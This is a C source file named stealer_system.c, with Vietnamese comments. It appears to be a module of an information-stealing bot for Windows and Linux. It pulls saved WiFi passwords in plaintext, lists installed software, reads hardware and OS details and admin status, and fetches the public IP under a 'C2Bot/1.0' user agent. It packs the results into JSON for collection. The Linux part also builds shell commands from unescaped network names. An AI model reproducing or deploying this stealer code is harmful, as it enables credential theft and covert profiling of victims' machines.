/**
 * stealer_system.c
 * Thu thap thong tin he thong: OS, CPU, RAM, GPU, disk, IP, WiFi passwords, phan mem
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <iphlpapi.h>
    #include <wlanapi.h>
    #include <shlobj.h>
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "wlanapi.lib")
#else
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/utsname.h>
    #include <netdb.h>
    #include <ifaddrs.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <pwd.h>
#endif

#include "stealer_system.h"

#ifdef _WIN32
/* ==================== WINDOWS SYSTEM INFO ==================== */

/**
 * Lay WiFi passwords (WLAN profiles)
 */
static int lay_wifi_passwords(char* buffer, size_t buffer_size) {
    HANDLE wlan_handle = NULL;
    DWORD negotiated_version = 0;
    
    if (WlanOpenHandle(2, NULL, &negotiated_version, &wlan_handle) != ERROR_SUCCESS) {
        return -1;
    }
    
    PWLAN_INTERFACE_INFO_LIST interface_list = NULL;
    if (WlanEnumInterfaces(wlan_handle, NULL, &interface_list) != ERROR_SUCCESS) {
        WlanCloseHandle(wlan_handle, NULL);
        return -1;
    }
    
    int offset = 0;
    offset += snprintf(buffer + offset, buffer_size - offset, "[");
    int dau_tien = 1;
    
    for (DWORD i = 0; i < interface_list->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST profile_list = NULL;
        
        if (WlanGetProfileList(wlan_handle, &interface_list->InterfaceInfo[i].InterfaceGuid,
                                NULL, &profile_list) == ERROR_SUCCESS) {
            for (DWORD j = 0; j < profile_list->dwNumberOfItems; j++) {
                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD access = 0;
                LPWSTR xml_data = NULL;
                
                if (WlanGetProfile(wlan_handle, &interface_list->InterfaceInfo[i].InterfaceGuid,
                                   profile_list->ProfileInfo[j].strProfileName,
                                   NULL, &xml_data, &flags, &access) == ERROR_SUCCESS) {
                    
                    /* Tim keyMaterial trong XML */
                    char xml_utf8[4096];
                    WideCharToMultiByte(CP_UTF8, 0, xml_data, -1, xml_utf8, sizeof(xml_utf8), NULL, NULL);
                    
                    char* key_start = strstr(xml_utf8, "<keyMaterial>");
                    if (key_start != NULL) {
                        key_start += 13; /* strlen("<keyMaterial>") */
                        char* key_end = strstr(key_start, "</keyMaterial>");
                        
                        if (key_end != NULL) {
                            char password[256] = {0};
                            size_t pass_len = key_end - key_start;
                            if (pass_len > 255) pass_len = 255;
                            strncpy(password, key_start, pass_len);
                            
                            char ssid[256];
                            WideCharToMultiByte(CP_UTF8, 0, profile_list->ProfileInfo[j].strProfileName,
                                               -1, ssid, sizeof(ssid), NULL, NULL);
                            
                            if (!dau_tien) {
                                offset += snprintf(buffer + offset, buffer_size - offset, ",");
                            }
                            dau_tien = 0;
                            
                            offset += snprintf(buffer + offset, buffer_size - offset,
                                "{\"ssid\":\"%s\",\"password\":\"%s\"}", ssid, password);
                        }
                    }
                    
                    WlanFreeMemory(xml_data);
                }
            }
            WlanFreeMemory(profile_list);
        }
    }
    
    offset += snprintf(buffer + offset, buffer_size - offset, "]");
    
    WlanFreeMemory(interface_list);
    WlanCloseHandle(wlan_handle, NULL);
    return 0;
}

/**
 * Lay danh sach phan mem da cai dat
 */
static int lay_danh_sach_phan_mem(char* buffer, size_t buffer_size) {
    HKEY hkey;
    const char* reg_paths[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        NULL
    };
    
    int offset = 0;
    offset += snprintf(buffer + offset, buffer_size - offset, "[");
    int dau_tien = 1;
    int so_phan_mem = 0;
    
    for (int r = 0; reg_paths[r] != NULL; r++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg_paths[r], 0, 
                          KEY_READ | KEY_WOW64_64KEY, &hkey) == ERROR_SUCCESS) {
            
            DWORD index = 0;
            char subkey_name[256];
            DWORD subkey_size = sizeof(subkey_name);
            
            while (RegEnumKeyExA(hkey, index, subkey_name, &subkey_size, 
                                 NULL, NULL, NULL, NULL) == ERROR_SUCCESS && so_phan_mem < 100) {
                HKEY subkey;
                if (RegOpenKeyExA(hkey, subkey_name, 0, KEY_READ, &subkey) == ERROR_SUCCESS) {
                    char display_name[256] = {0};
                    DWORD name_size = sizeof(display_name);
                    
                    if (RegQueryValueExA(subkey, "DisplayName", NULL, NULL, 
                                         (LPBYTE)display_name, &name_size) == ERROR_SUCCESS) {
                        if (strlen(display_name) > 0) {
                            if (!dau_tien) {
                                offset += snprintf(buffer + offset, buffer_size - offset, ",");
                            }
                            dau_tien = 0;
                            
                            offset += snprintf(buffer + offset, buffer_size - offset,
                                "\"%s\"", display_name);
                            so_phan_mem++;
                        }
                    }
                    RegCloseKey(subkey);
                }
                
                index++;
                subkey_size = sizeof(subkey_name);
            }
            RegCloseKey(hkey);
        }
    }
    
    offset += snprintf(buffer + offset, buffer_size - offset, "]");
    return so_phan_mem;
}

/**
 * Thu thap thong tin he thong
 */
int steal_system_info(char* ket_qua, size_t ket_qua_size) {
    char hostname[256] = {0};
    DWORD hostname_size = sizeof(hostname);
    GetComputerNameA(hostname, &hostname_size);
    
    /* OS info */
    char os_info[128] = "Windows";
    OSVERSIONINFOEXA os_ver;
    ZeroMemory(&os_ver, sizeof(os_ver));
    os_ver.dwOSVersionInfoSize = sizeof(os_ver);
    
    /* Su dung RtlGetVersion cho chinh xac */
    typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll != NULL) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (RtlGetVersion != NULL) {
            RTL_OSVERSIONINFOW ver;
            ver.dwOSVersionInfoSize = sizeof(ver);
            if (RtlGetVersion(&ver) == 0) {
                snprintf(os_info, sizeof(os_info), "Windows %lu.%lu Build %lu",
                         ver.dwMajorVersion, ver.dwMinorVersion, ver.dwBuildNumber);
            }
        }
    }
    
    /* CPU info */
    char cpu[128] = "Unknown";
    HKEY hkey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                      0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        DWORD cpu_size = sizeof(cpu);
        RegQueryValueExA(hkey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpu, &cpu_size);
        RegCloseKey(hkey);
    }
    
    /* RAM info */
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status);
    char ram[64];
    snprintf(ram, sizeof(ram), "Total: %llu MB, Available: %llu MB",
             mem_status.ullTotalPhys / (1024 * 1024),
             mem_status.ullAvailPhys / (1024 * 1024));
    
    /* Disk info */
    char disk[256] = "Unknown";
    ULARGE_INTEGER total_bytes, free_bytes;
    if (GetDiskFreeSpaceExA("C:\\", &free_bytes, &total_bytes, NULL)) {
        snprintf(disk, sizeof(disk), "Total: %llu GB, Free: %llu GB",
                 total_bytes.QuadPart / (1024 * 1024 * 1024),
                 free_bytes.QuadPart / (1024 * 1024 * 1024));
    }
    
    /* IP addresses */
    char ip_local[512] = "[]";
    char ip_public[64] = "Unknown";
    
    /* Lay IP public */
    HINTERNET session = WinHttpOpen(L"C2Bot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (session != NULL) {
        HINTERNET connect = WinHttpConnect(session, L"api.ipify.org", 443, 0);
        if (connect != NULL) {
            HINTERNET request = WinHttpOpenRequest(connect, L"GET", L"/", NULL,
                                                    WINHTTP_NO_REFERER,
                                                    WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                    WINHTTP_FLAG_SECURE);
            if (request != NULL) {
                WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
                WinHttpReceiveResponse(request, NULL);
                DWORD bytes_doc;
                WinHttpReadData(request, ip_public, sizeof(ip_public) - 1, &bytes_doc);
                ip_public[bytes_doc] = '\0';
                WinHttpCloseHandle(request);
            }
            WinHttpCloseHandle(connect);
        }
        WinHttpCloseHandle(session);
    }
    
    /* WiFi passwords */
    char wifi_passwords[16384] = "[]";
    lay_wifi_passwords(wifi_passwords, sizeof(wifi_passwords));
    
    /* Installed software */
    char phan_mem[16384] = "[]";
    lay_danh_sach_phan_mem(phan_mem, sizeof(phan_mem));
    
    /* GPU info */
    char gpu[256] = "Unknown";
    DISPLAY_DEVICEA display_device;
    ZeroMemory(&display_device, sizeof(display_device));
    display_device.cb = sizeof(display_device);
    if (EnumDisplayDevicesA(NULL, 0, &display_device, 0)) {
        strncpy(gpu, display_device.DeviceString, sizeof(gpu) - 1);
    }
    
    /* Architecture */
    char arch[16] = "x86";
    SYSTEM_INFO sys_info;
    GetNativeSystemInfo(&sys_info);
    if (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        strcpy(arch, "x64");
    } else if (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        strcpy(arch, "ARM64");
    }
    
    /* Is Admin */
    int is_admin = IsUserAnAdmin() ? 1 : 0;
    
    /* Tao JSON */
    snprintf(ket_qua, ket_qua_size,
        "{"
        "\"hostname\":\"%s\","
        "\"os\":\"%s\","
        "\"arch\":\"%s\","
        "\"cpu\":\"%s\","
        "\"ram\":\"%s\","
        "\"gpu\":\"%s\","
        "\"disk\":\"%s\","
        "\"ip_public\":\"%s\","
        "\"is_admin\":%s,"
        "\"wifi_passwords\":%s,"
        "\"installed_software\":%s"
        "}",
        hostname, os_info, arch, cpu, ram, gpu, disk,
        ip_public, is_admin ? "true" : "false",
        wifi_passwords, phan_mem);
    
    return 0;
}

#else
/* ==================== LINUX/MACOS SYSTEM INFO ==================== */

int steal_system_info(char* ket_qua, size_t ket_qua_size) {
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    
    /* OS info */
    struct utsname uname_data;
    char os_info[128] = "Unknown";
    if (uname(&uname_data) == 0) {
        snprintf(os_info, sizeof(os_info), "%s %s %s",
                 uname_data.sysname, uname_data.release, uname_data.machine);
    }
    
    /* CPU info */
    char cpu[128] = "Unknown";
    FILE* cpuinfo = fopen("/proc/cpuinfo", "r");
    if (cpuinfo != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), cpuinfo)) {
            if (strstr(line, "model name") != NULL) {
                char* colon = strchr(line, ':');
                if (colon != NULL) {
                    strncpy(cpu, colon + 2, sizeof(cpu) - 1);
                    char* nl = strchr(cpu, '\n');
                    if (nl) *nl = '\0';
                }
                break;
            }
        }
        fclose(cpuinfo);
    }
    
    /* RAM info */
    char ram[64] = "Unknown";
    FILE* meminfo = fopen("/proc/meminfo", "r");
    if (meminfo != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), meminfo)) {
            if (strstr(line, "MemTotal") != NULL) {
                char* colon = strchr(line, ':');
                if (colon != NULL) {
                    strncpy(ram, colon + 2, sizeof(ram) - 1);
                    char* nl = strchr(ram, '\n');
                    if (nl) *nl = '\0';
                }
                break;
            }
        }
        fclose(meminfo);
    }
    
    /* GPU info */
    char gpu[256] = "Unknown";
    FILE* lspci = popen("lspci | grep -i vga 2>/dev/null", "r");
    if (lspci != NULL) {
        if (fgets(gpu, sizeof(gpu), lspci) != NULL) {
            char* nl = strchr(gpu, '\n');
            if (nl) *nl = '\0';
        }
        pclose(lspci);
    }
    
    /* Disk info */
    char disk[256] = "Unknown";
    FILE* df = popen("df -h / 2>/dev/null | tail -1", "r");
    if (df != NULL) {
        char line[256];
        if (fgets(line, sizeof(line), df) != NULL) {
            char filesystem[64], size[32], used[32], avail[32], use_pct[16], mount[128];
            if (sscanf(line, "%s %s %s %s %s %s", filesystem, size, used, avail, use_pct, mount) >= 4) {
                snprintf(disk, sizeof(disk), "Total: %s, Available: %s", size, avail);
            }
        }
        pclose(df);
    }
    
    /* IP addresses */
    char ip_public[64] = "Unknown";
    FILE* curl = popen("curl -s https://api.ipify.org 2>/dev/null", "r");
    if (curl != NULL) {
        if (fgets(ip_public, sizeof(ip_public), curl) != NULL) {
            char* nl = strchr(ip_public, '\n');
            if (nl) *nl = '\0';
        }
        pclose(curl);
    }
    
    /* Is root */
    int is_admin = (getuid() == 0) ? 1 : 0;
    
    /* Architecture */
    char arch[16] = "Unknown";
    if (strstr(os_info, "x86_64") != NULL || strstr(os_info, "amd64") != NULL) {
        strcpy(arch, "x64");
    } else if (strstr(os_info, "aarch64") != NULL) {
        strcpy(arch, "ARM64");
    } else if (strstr(os_info, "i386") != NULL || strstr(os_info, "i686") != NULL) {
        strcpy(arch, "x86");
    }
    
    /* WiFi passwords (Linux - tu /etc/NetworkManager) */
    char wifi_passwords[8192] = "[]";
    FILE* nmcli = popen("nmcli -t -f NAME connection show 2>/dev/null", "r");
    if (nmcli != NULL) {
        char ssid[256];
        int offset = 0;
        offset += snprintf(wifi_passwords + offset, sizeof(wifi_passwords) - offset, "[");
        int dau_tien = 1;
        
        while (fgets(ssid, sizeof(ssid), nmcli)) {
            char* nl = strchr(ssid, '\n');
            if (nl) *nl = '\0';
            
            if (strlen(ssid) > 0) {
                /* Lay password cho tung SSID */
                char cmd[512];
                snprintf(cmd, sizeof(cmd), "nmcli -s -g 802-11-wireless-security.psk connection show \"%s\" 2>/dev/null", ssid);
                FILE* pass_file = popen(cmd, "r");
                char password[256] = "";
                if (pass_file != NULL) {
                    fgets(password, sizeof(password), pass_file);
                    char* pnl = strchr(password, '\n');
                    if (pnl) *pnl = '\0';
                    pclose(pass_file);
                }
                
                if (strlen(password) > 0) {
                    if (!dau_tien) {
                        offset += snprintf(wifi_passwords + offset, sizeof(wifi_passwords) - offset, ",");
                    }
                    dau_tien = 0;
                    offset += snprintf(wifi_passwords + offset, sizeof(wifi_passwords) - offset,
                        "{\"ssid\":\"%s\",\"password\":\"%s\"}", ssid, password);
                }
            }
        }
        offset += snprintf(wifi_passwords + offset, sizeof(wifi_passwords) - offset, "]");
        pclose(nmcli);
    }
    
    snprintf(ket_qua, ket_qua_size,
        "{"
        "\"hostname\":\"%s\","
        "\"os\":\"%s\","
        "\"arch\":\"%s\","
        "\"cpu\":\"%s\","
        "\"ram\":\"%s\","
        "\"gpu\":\"%s\","
        "\"disk\":\"%s\","
        "\"ip_public\":\"%s\","
        "\"is_admin\":%s,"
        "\"wifi_passwords\":%s,"
        "\"installed_software\":[]"
        "}",
        hostname, os_info, arch, cpu, ram, gpu, disk,
        ip_public, is_admin ? "true" : "false",
        wifi_passwords);
    
    return 0;
}

#endif